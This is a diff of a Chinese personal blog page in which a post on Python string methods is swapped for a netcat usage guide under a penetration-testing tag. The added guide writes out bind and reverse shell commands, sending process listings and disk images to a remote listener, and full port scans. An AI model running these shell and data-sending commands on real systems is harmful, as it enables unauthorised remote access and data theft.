@@ -4,21 +4,22 @@
 <head>
   <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
-<meta name="description" content="Python字符串处理的一些基本操作
+<meta name="description" content="NC(netcat)被称为网络工具中的瑞士军刀，体积小巧，但功能强大
 
-01.反转字符串
-s = &quot;Python&quot;
+主要功能
 
-#方法1
-rs1 = ''.join(reversed(s))
-print(rs)
+可以在两台设备上面相互交互，即侦听模式/传输模式
 
-#方法2
-rs2 = s[::-1]
-print..." />
+
+Telnet功能
+获取banner信息
+传输文本信息
+传输文件/目录
+加密传输文件，默认不加密
+远程控..." />
 <link rel="preload" as="script" href="https://cdn.ampproject.org/v0.js">
 <script async src="https://cdn.ampproject.org/v0.js"></script>
-<title>Python字符串 | 一小步</title>
+<title>NetCat使用指南 | 一小步</title>
 <style amp-custom>
 body{width:100vw;display:flex;flex-direction:column;font-family:'PT Serif',-apple-system-font,"Helvetica Neue","PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif,serif;background:#fff}
 :focus{outline:0}
@@ -429,7 +430,7 @@ hr{height:.1333vw;margin-top:5.3333vw;margin-bottom:5.3333vw}
 </style>
 <style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}</style>
 <noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript>
-<link rel="canonical" href="https://MaHule.github.io/post/python-zi-fu-chuan/" />
+<link rel="canonical" href="https://MaHule.github.io/post/netcat-shi-yong-zhi-nan/" />
 <link rel="shortcut icon" href="https://MaHule.github.io/favicon.ico?v=1586911451008">
 <script async custom-element="amp-form" src="https://cdn.ampproject.org/v0/amp-form-0.1.js"></script>
 <script async custom-element="amp-video" src="https://cdn.ampproject.org/v0/amp-video-0.1.js"></script>
@@ -442,7 +443,7 @@ hr{height:.1333vw;margin-top:5.3333vw;margin-bottom:5.3333vw}
 
 <script async custom-element="amp-gist" src="https://cdn.ampproject.org/v0/amp-gist-0.1.js"></script>
 
-<link rel="alternate" type="application/atom+xml" title="Python字符串 | 一小步 - Atom Feed" href="https://MaHule.github.io/atom.xml">
+<link rel="alternate" type="application/atom+xml" title="NetCat使用指南 | 一小步 - Atom Feed" href="https://MaHule.github.io/atom.xml">
 
   
 
@@ -503,112 +504,104 @@ hr{height:.1333vw;margin-top:5.3333vw;margin-bottom:5.3333vw}
       <div class="article-info">
         
           <div class="flex-box meta-category">
-            <a class="post-cate" href="https://MaHule.github.io/tag/uQJCDEn4z/">Python</a></div>
+            <a class="post-cate" href="https://MaHule.github.io/tag/PmmDJSBWv/">渗透测试</a></div>
           
         <h2 class="article-title">
-          <a href="https://MaHule.github.io/post/python-zi-fu-chuan/">Python字符串</a>
+          <a href="https://MaHule.github.io/post/netcat-shi-yong-zhi-nan/">NetCat使用指南</a>
         </h2>
         <div class="flex-box">
           <div class="flex-box post-meta-box">
             <a class="post-meta" href="https://MaHule.github.io"><span
                 class="iconfont icon-mr-postmeta"></span>MaHule</a>
-            <span class="post-meta"><span class="iconfont icon-mr-postmeta"></span>2020-04-03</span>
+            <span class="post-meta"><span class="iconfont icon-mr-postmeta"></span>2020-04-15</span>
           </div>
         </div>
       </div>
       <div class="content">
-        <p>Python字符串处理的一些基本操作</p>
+        <p>NC(netcat)被称为网络工具中的瑞士军刀，体积小巧，但功能强大</p>
 <!-- more -->
-<h3 id="01反转字符串">01.反转字符串</h3>
-<pre><code class="language-python">s = &quot;Python&quot;
-
-#方法1
-rs1 = ''.join(reversed(s))
-print(rs)
-
-#方法2
-rs2 = s[::-1]
-print(rs2)
-</code></pre>
-<pre><code>nohtyP
-nohtyP
-</code></pre>
-<h3 id="02字符串切片操作">02.字符串切片操作</h3>
-<pre><code class="language-python">java,python = &quot;java&quot;,&quot;python&quot;
-jl,pl = len(java),len(python)
-
-[str(java[i%3*jl:] + python[i%5*pl:] or i) for i in range(1,10)]
-</code></pre>
-<pre><code>['1', '2', 'java', '4', 'python', 'java', '7', '8', 'java']
-</code></pre>
-<h3 id="03join连接字符串">03.join连接字符串</h3>
-<pre><code class="language-python">mystr = ['I','love','Python']
-
-res = '_'.join(mystr)
-print(res)
-</code></pre>
-<pre><code>I_love_Python
-</code></pre>
-<h3 id="04分割字符串">04.分割字符串</h3>
+<h4 id="主要功能">主要功能</h4>
 <blockquote>
-<p>根据指定字符或字符串，分割一个字符串时，使用方法split（join和split可以看作做一对互逆操作）</p>
-</blockquote>
-<pre><code class="language-python">res.split('_')
-</code></pre>
-<pre><code>['I', 'love', 'Python']
-</code></pre>
-<h3 id="05替换">05.替换</h3>
-<blockquote>
-<p>字符串替换使用replace方法</p>
-</blockquote>
-<pre><code class="language-python">s = 'i love python'.replace('o','O')
-s
-</code></pre>
-<pre><code>'i lOve pythOn'
-</code></pre>
-<h3 id="06子串判断">06.子串判断</h3>
-<blockquote>
-<p>判断a字符串是否为b字符串的字串</p>
+<p>可以在两台设备上面相互交互，即侦听模式/传输模式</p>
 </blockquote>
 <ul>
-<li>方法1：使用in</li>
+<li>Telnet功能</li>
+<li>获取banner信息</li>
+<li>传输文本信息</li>
+<li>传输文件/目录</li>
+<li>加密传输文件，默认不加密</li>
+<li>远程控制</li>
+<li>加密所有流量</li>
+<li>流媒体服务器</li>
 </ul>
-<pre><code class="language-python">a = 'our'
-b = 'flourish'
+<h3 id="具体介绍">具体介绍</h3>
+<p><code>nc -h</code> 查看nc的传输说明：</p>
+<figure data-type="image" tabindex="1"><img src="https://MaHule.github.io/post-images/netcat/01.png" alt="netcat" loading="lazy"></figure>
+<h4 id="01-nc远程控制">01. NC远程控制</h4>
+<p>正向连接：</p>
+<pre><code class="language-bash">A: nc -lp 需要开放端口 -c bash   #服务器开放端口，等待连接
 
-r = True if a in b else False
-r
-</code></pre>
-<pre><code>True
-</code></pre>
-<ul>
-<li>方法2：使用方法find，返回字符串b中匹配字串a的最小索引：</li>
-</ul>
-<pre><code class="language-python">a = 'our'
-b = 'flourish'
+B: nc ip:port     #客户机连接服务器
 
-b.find(a)
+#A将自己的bash发送给B
 </code></pre>
-<pre><code>2
-</code></pre>
-<h3 id="07去空格">07.去空格</h3>
-<p>清洗字符串时，位于字符串开始和结尾的空格，有时需要去掉，strip方法能实现</p>
-<pre><code class="language-python">a = '  \tI love python  \b\n'
-print(a)
-print(a.strip())
-</code></pre>
-<pre><code>  	I love python  
+<p>反向连接：</p>
+<pre><code class="language-bash">A: nc -lp port 
 
-I love python  
+B: nc ip port -c bash
+
+#B将自己的bash发给A
 </code></pre>
-<h3 id="08字符串的字节长度">08.字符串的字节长度</h3>
-<p>encode方法对字符串编码后：</p>
-<pre><code class="language-python">def str_byte_len(mystr):
-    mystr_bytes = mystr.encode('utf-8')
-    return (len(mystr_bytes))
+<p><strong>注：</strong> Windows下需要将Bash换成cmd</p>
+<h4 id="02-使用nc进行信息收集">02. 使用NC进行信息收集</h4>
+<ol>
+<li>简单的建立连接（双方可以进行文本信息的交换）</li>
+</ol>
+<pre><code class="language-bash">A: nc -l -p port     #监听指定端口号
+
+B: nc -nv ip port    #连接对方tcp端口，默认情况下，双方可以发送文本信息 
+</code></pre>
+<ol start="2">
+<li>收集目标主机上的进程信息</li>
+</ol>
+<pre><code class="language-bash">nc -l -p 4444 &gt; wing.txt     #将远程发送过来的内容保存在本地
+
+ps -aux | nc -nv ip port -q 1  #标准输入完成后delay一秒钟，会发送到侦听端
+</code></pre>
+<h4 id="03-nc传输文件">03. NC传输文件</h4>
+<pre><code class="language-bash">A: nc -lp 4444 &gt; 1.txt     #打开4444端口，将接受到的数据保存为1.txt
+
+B: nc -nv ip port &lt; 1.txt -q 1  #将文件发送给侦听端
+
+#PS：侦听端口接受的文件名最好于发送端发送文件的名字一致
+
+</code></pre>
+<h4 id="04nc文件加密传输">04.NC文件加密传输</h4>
+<pre><code class="language-bash">A: nc -lp port | mcrypt --flush -Fbqd -a rijndael-256 -m ecb &gt; 文件名
+
+B: mcrypt --flush -Fbq -a rijndael-256 -m ecb &lt; 文件名 | nc -nv ip port -q 1
+</code></pre>
+<p><strong>注：</strong> B将文件加密发送，A接受后先保存到本地，B在一秒后退出。加密方式利用的是mcrypt加密</p>
+<h4 id="05-nc流媒体服务">05. NC流媒体服务</h4>
+<pre><code class="language-bash">A: cat wing.mp4 | nc -lp port    #用cat打开视频文件，然后将视频文件通过nc发送
+
+B: nc -nv ip port | mplayer -vo x11 -cache 4000  #将接收到的流媒体文件通过mplayer（是一个视频的播放器）打开。
+</code></pre>
+<h4 id="06-nc端口扫描">06. NC端口扫描</h4>
+<pre><code class="language-bash">nc -nvz ip 1-65535      #扫描tcp中1-65535端口的开放情况
+</code></pre>
+<pre><code class="language-bash">nc -nvzu ip 1-65535     #扫描udp中1-65535端口的开放情况
+</code></pre>
+<h4 id="07nc复制磁盘">07.NC复制磁盘</h4>
+<pre><code class="language-bash">A: nc -lp port | dd of=/dev/sda
+
+B: dd if=/dev/sda | nc -nc ip port -q 1
+
+if = input filter
+of = output filter
 
 
-str_byte_len('i love python')
+#B将数据复制到A挂载的硬盘上
 </code></pre>
 
       </div>
@@ -616,13 +609,9 @@ str_byte_len('i love python')
       
       <nav class="post-nav">
         
-        <div class="nav-previous">
-          <a class="post-nav-link-active" title="Python列表生成式高效使用" href="https://MaHule.github.io/post/python-lie-biao-sheng-cheng-shi-gao-xiao-shi-yong/">上一篇文章</a>
-        </div>
-        
         
         <div class="nav-next">
-          <a class="post-nav-link-active" title="List和tuple的13个经典实例" href="https://MaHule.github.io/post/list-he-tuple-de-13-ge-jing-dian-shi-li/">下一篇文章</a>
+          <a class="post-nav-link-active" title="Vi （终端中的编辑器）" href="https://MaHule.github.io/post/vi-zhong-duan-zhong-de-bian-ji-qi/">下一篇文章</a>
           
 
         </div>
@@ -699,8 +688,8 @@ str_byte_len('i love python')
     <h4 class="widget-title">分类目录</h4>
     <ul>
       
-      <li class="cat-item"><a href="https://MaHule.github.io/tag/uQJCDEn4z/">
-          Python
+      <li class="cat-item"><a href="https://MaHule.github.io/tag/PmmDJSBWv/">
+          渗透测试
           
         </a>
       </li>
